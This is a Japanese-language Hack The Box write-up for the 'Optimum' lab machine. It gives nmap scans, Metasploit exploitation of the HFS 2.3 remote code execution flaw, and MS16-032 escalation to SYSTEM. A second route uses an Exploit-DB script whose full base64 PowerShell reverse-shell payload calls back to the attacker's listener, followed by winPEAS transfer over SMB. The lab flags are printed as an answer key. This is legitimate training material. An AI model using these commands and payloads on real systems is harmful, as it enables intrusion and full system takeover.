https://app.hackthebox.com/machines/Optimum
## STEP 1
80番がオープン
```sh
└─$ nmap -n -Pn --top-ports=1000 -sV -sC --max-retries=0 10.129.16.57
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 09:16 EDT
Warning: 10.129.16.57 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.129.16.57
Host is up (0.30s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.00 seconds
```
大した脆弱性はなさそう
```sh
└─$ nmap -n -Pn -p80 --script=vuln 10.129.16.57
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 09:17 EDT
Nmap scan report for 10.129.16.57
Host is up (0.31s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.securityfocus.com/bid/49303
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://seclists.org/fulldisclosure/2011/Aug/175
|_      https://www.tenable.com/plugins/nessus/55976
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     /~login [GENERIC]
|   
|     References:
|       http://www.mkit.com.ar/labs/htexploit/
|       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|_      http://capec.mitre.org/data/definitions/274.html
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 1416.46 seconds
```



# SOLUTION 1
USE METASPLOIT
## STEP 2
80番にアクセス、どうやら「Search」の部分にヌル文字列を介したRCEができるらしい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Optimum_01.png" width="50%" height="50%">  
Nmapの結果から、HFS 2.3 を使用していることを確認、RCEの脆弱性を確認できた  
エクスプロイト実施、リバースシェル取得！ユーザフラグゲットは取得できた、ルートフラグは権限足りず
```sh
msf6 > search hfs 2.3

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec           2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1    \_ target: Automatic                               .                .          .      .
   2    \_ target: Windows Powershell                      .                .          .      .
   3  exploit/windows/http/rejetto_hfs_rce_cve_2024_23692  2024-05-25       excellent  Yes    Rejetto HTTP File Server (HFS) Unauthenticated Remote Code Execution
   4  exploit/windows/http/rejetto_hfs_exec                2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/http/rejetto_hfs_exec


msf6 > use 4
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.18.142.100   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.129.8.79
RHOSTS => 10.129.8.79
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST tun0
LHOST => 10.10.14.109

msf6 exploit(windows/http/rejetto_hfs_exec) > run
[*] Started reverse TCP handler on 10.10.14.109:4444 
[*] Using URL: http://10.10.14.109:8080/jpY2t6RtfB
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /jpY2t6RtfB
[*] Sending stage (177734 bytes) to 10.129.8.79
[!] Tried to delete %TEMP%\ZPIJcBjkfWyz.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.14.109:4444 -> 10.129.8.79:49166) at 2025-04-26 17:16:23 -0400
[*] Server stopped.

meterpreter > getuid
Server username: OPTIMUM\kostas

meterpreter > ls
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2025-05-03 14:28:33 -0400  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 07:57:16 -0400  desktop.ini
100777/rwxrwxrwx  760320  fil   2017-03-18 08:11:17 -0400  hfs.exe
100444/r--r--r--  34      fil   2025-05-03 14:17:39 -0400  user.txt

meterpreter > cat user.txt
0459b60dcc7d0c54a66b36d6b09189a8
```


## STEP 3
`post/multi/recon/local_exploit_suggester`でEoPを探す
```sh
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.129.8.79 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.129.8.79 - 204 exploit checks are being tried...
[+] 10.129.8.79 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.129.8.79 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.8.79 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.129.8.79 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.129.8.79 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.129.8.79 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.129.8.79 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 8   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 9   exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 10  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 11  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 12  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 13  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 14  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 15  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 16  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 17  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 18  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 19  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 20  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 21  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
 22  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 23  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
 24  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2012 R2 (6.3 Build 9600). is not vulnerable
 25  exploit/windows/local/ms13_053_schlamperei                     No                       The target is not exploitable.
 26  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.
 27  exploit/windows/local/ms14_058_track_popup_menu                No                       The target is not exploitable.
 28  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 29  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
 30  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
 32  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 33  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 37  exploit/windows/local/ntusermndragover                         No                       The target is not exploitable.
 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 39  exploit/windows/local/ppr_flatten_rec                          No                       The target is not exploitable.
 40  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 42  exploit/windows/local/webexec                                  No                       The check raised an exception.
```
`exploit/windows/local/ms16_032_secondary_logon_handle_privesc`で権限昇格！
```sh
msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.109:4444 -> 10.129.8.79:49166 (10.129.8.79)

msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.18.142.100   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1
SESSION => 1

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST tun0
LHOST => 10.10.14.109

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
[*] Started reverse TCP handler on 10.10.14.109:4444 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\ZlSugY.ps1...
[*] Compressing script contents...
[+] Compressed size: 3764
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1652

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $mCVwX = [Ntdll]::NtImpersonateThread($q2f56, $q2f56, [ref]$akgo)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (akgo:VariablePath) [], Runtim 
   eException
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo
ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."
At line:259 char:2
+     $mCVwX = [Advapi32]::DuplicateToken($znSm, 2, [ref]$xbCrH)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

tSCDEchRcD83DAITepAf0OUJeW09YCUU
[+] Executed on target machine.
[*] Sending stage (177734 bytes) to 10.129.8.79
[*] Meterpreter session 2 opened (10.10.14.109:4444 -> 10.129.8.79:49167) at 2025-04-26 17:24:21 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\ZlSugY.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
38d6aba1726a0d9481e7074f106a8f9c
```



# SOLUTION 2
NO METASPLOIT
## STEP 2
HTTPFileServer 2.3で、RCEの脆弱性を確認
```sh
└─$ searchsploit http file server 2.3
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                                                                                                                      | linux/remote/48130.rb
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                                                                                               | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                                                                               | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                                                                    | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                                                                            | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                                                                       | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                                                                       | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                                                                  | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                                               | windows/webapps/49125.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                            

└─$ searchsploit -m 49584            
  Exploit: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49584
     Path: /usr/share/exploitdb/exploits/windows/remote/49584.py
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (546)
Copied to: /home/kali/49584.py
```
PoCを修正、kaliとターゲットのIPアドレス・ポートを更新
```sh
lhost = "10.10.14.109"
lport = 4444
rhost = "10.129.8.79"
rport = 80
```
PoC実行、リバースシェル取得！ユーザフラグゲット
```sh
└─$ python3.13 49584.py

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.14.109
lport:  4444
rhost:  10.129.8.79
rport:  80
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADkAIgAsADQANAA0ADQAKQA7ACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

Listening for connection...
listening on [any] 4444 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.8.79] 49158


PS C:\Users\kostas\Desktop> whoami
optimum\kostas


PS C:\Users\kostas\Desktop> systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          3/5/2025, 9:16:56 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.420 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.807 MB
Virtual Memory: In Use:    696 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.8.79
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
とりあえずWinPEASでEoPを探す  
WinPEASのEXE・Powershell版は.net4.5.2が必要だが対応してないっぽい  
```sh
PS C:\Users\kostas\Desktop> ls C:\windows\microsoft.net\framework


    Directory: C:\windows\microsoft.net\framework


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
d----         22/8/2013   6:39 ??            v1.0.3705                                                                 
d----         22/8/2013   6:39 ??            v1.1.4322                                                                 
d----         22/8/2013   6:39 ??            v2.0.50727                                                                
d----          3/5/2025   9:27 ??            v4.0.30319                                                                
-a---         22/8/2013   7:06 ??       7680 sbscmp10.dll                                                              
-a---         22/8/2013   7:06 ??       7680 sbscmp20_mscorwks.dll                                                     
-a---         22/8/2013   7:06 ??       7680 sbscmp20_perfcounter.dll                                                  
-a---         22/8/2013   7:06 ??       7680 sbs_diasymreader.dll                                                      
-a---         22/8/2013   7:06 ??       7680 sbs_microsoft.jscript.dll                                                 
-a---         22/8/2013   7:06 ??       7680 sbs_mscordbi.dll                                                          
-a---         22/8/2013   7:06 ??       7680 sbs_mscorrc.dll                                                           
-a---         22/8/2013   7:06 ??       7680 sbs_mscorsec.dll                                                          
-a---         22/8/2013   7:06 ??       7680 sbs_system.configuration.install.dll                                      
-a---         22/8/2013   7:06 ??       7680 sbs_system.data.dll                                                       
-a---         22/8/2013   7:06 ??       7680 sbs_system.enterpriseservices.dll                                         
-a---         22/8/2013   7:06 ??       7680 sbs_wminet_utils.dll                                                      
-a---         22/8/2013   7:06 ??       7680 SharedReg12.dll
```
バッチ版を実行、KaliでwinPEAS.batをSMBサーバにアップロード
```sh
└─$ cp /usr/share/peass/winpeas/winPEAS.bat ./smb/


└─$ ls smb  
winPEAS.bat


└─$ impacket-smbserver share smb                       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
winPEAS.batをコピー、実行、実行結果をSMBサーバにアップロード  
どうやらPowershellセッション上ではバッチを実行すると固まるのでバックグラウンドで実行したほうが良い
```sh
PS C:\Users\kostas\Desktop> cp \\10.10.16.3\share\winPEAS.bat .


PS C:\Users\kostas\Desktop> ls


    Directory: C:\Users\kostas\Desktop


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
-ar--          4/5/2025  12:48 ??         34 user.txt                                                                  
-a---         24/4/2025   5:42 ??      36950 winPEAS.bat


PS C:\Users\kostas\Desktop> Start-Job { C:\Users\kostas\Desktop\winPEAS.bat > C:\Users\kostas\Desktop\peas.txt 2>&1 }                                                                                                                        
                                                                                                                                                                                                                                            
Id     Name            PSJobTypeName   State         HasMoreData     Location             Command                                                                                                                                           
--     ----            -------------   -----         -----------     --------             -------                                                                                                                                           
1      Job1            BackgroundJob   Running       True            localhost            C:\Users\kostas\Deskto...


PS C:\Users\kostas\Desktop> get-job                                                                                                                                                                                                         
                                                                                                                                                                                                                                            
Id     Name            PSJobTypeName   State         HasMoreData     Location             Command                                                                                                                                           
--     ----            -------------   -----         -----------     --------             -------                                                                                                                                                                                   
1      Job1            BackgroundJob   Completed     False           localhost            C:\Users\kostas\Deskto...


PS C:\Users\kostas\Desktop> cp peas.txt \\10.10.16.3\share\peas.txt
```
WinPEASからEoPできる脆弱性を探したが、表示されていない...ほかのツールで探すしかない
```sh
─$ cat smb/peas.txt 
��
            ((,.,/((((((((((((((((((((/,  */
     ,/*,..*(((((((((((((((((((((((((((((((((,                                                                                                                                                                                              
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*                                                                                                                                                                                           
   ((((((((((((((((* *****,,,/########## .(* ,((((((                                                                                                                                                                                        
   (((((((((((/* ******************/####### .(. ((((((                                                                                                                                                                                      
   ((((((..******************/@@@@@/***/###### /((((((                                                                                                                                                                                      
   ,,..**********************@@@@@@@@@@(***,#### ../(((((                                                                                                                                                                                   
   , ,**********************#@@@@@#@@@@*********##((/ /((((                                                                                                                                                                                 
   ..(((##########*********/#@@@@@@@@@/*************,,..((((                                                                                                                                                                                
   .(((################(/******/@@@@@#****************.. /((                                                                                                                                                                                
   .((########################(/************************..*(                                                                                                                                                                                
   .((#############################(/********************.,(                                                                                                                                                                                
   .((##################################(/***************..(                                                                                                                                                                                
   .((######################################(************..(                                                                                                                                                                                
   .((######(,.***.,(###################(..***(/*********..(                                                                                                                                                                                
   .((######*(#####((##################((######/(********..(                                                                                                                                                                                
   .((##################(/**********(################(**...(                                                                                                                                                                                
   .(((####################/*******(###################.((((                                                                                                                                                                                
   .(((((############################################/  /((                                                                                                                                                                                 
   ..(((((#########################################(..(((((.                                                                                                                                                                                
   ....(((((#####################################( .((((((.                                                                                                                                                                                 
   ......(((((#################################( .(((((((.                                                                                                                                                                                  
   (((((((((. ,(############################(../(((((((((.                                                                                                                                                                                  
       (((((((((/,  ,####################(/..((((((((((.                                                                                                                                                                                    
             (((((((((/,.  ,*//////*,. ./(((((((((((.                                                                                                                                                                                       
                (((((((((((((((((((((((((((/                                                                                                                                                                                                
                       by carlospolop                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
/!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script                                                                                                                                                                   
   WinPEAS should be used for authorized penetration testing and/or educational purposes only.                                                                                                                                              
   Any misuse of this software will not be the responsibility of the author or of any other collaborator.                                                                                                                                   
   Use it at your own networks and/or with the network owner's permission.                                                                                                                                                                  
                                                                                                                                                                                                                                            
[*] BASIC SYSTEM INFO                                                                                                                                                                                                                       
 [+] WINDOWS OS                                                                                                                                                                                                                             
   [i] Check for vulnerabilities for the OS version with the applied patches                                                                                                                                                                
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits                                                                                                                     
                                                                                                                                                                                                                                            
Host Name:                 OPTIMUM                                                                                                                                                                                                          
OS Name:                   Microsoft Windows Server 2012 R2 Standard                                                                                                                                                                        
OS Version:                6.3.9600 N/A Build 9600                                                                                                                                                                                          
OS Manufacturer:           Microsoft Corporation                                                                                                                                                                                            
OS Configuration:          Standalone Server                                                                                                                                                                                                
OS Build Type:             Multiprocessor Free                                                                                                                                                                                              
Registered Owner:          Windows User                                                                                                                                                                                                     
Registered Organization:                                                                                                                                                                                                                    
Product ID:                00252-70000-00000-AA535                                                                                                                                                                                          
Original Install Date:     18/3/2017, 1:51:36 ��                                                                                                                                                                                            
System Boot Time:          4/5/2025, 12:48:07 ��                                                                                                                                                                                            
System Manufacturer:       VMware, Inc.                                                                                                                                                                                                     
System Model:              VMware Virtual Platform                                                                                                                                                                                          
System Type:               x64-based PC                                                                                                                                                                                                     
Processor(s):              1 Processor(s) Installed.                                                                                                                                                                                        
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz                                                                                                                                                  
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020                                                                                                                                                                        
Windows Directory:         C:\Windows                                                                                                                                                                                                       
System Directory:          C:\Windows\system32                                                                                                                                                                                              
Boot Device:               \Device\HarddiskVolume1                                                                                                                                                                                          
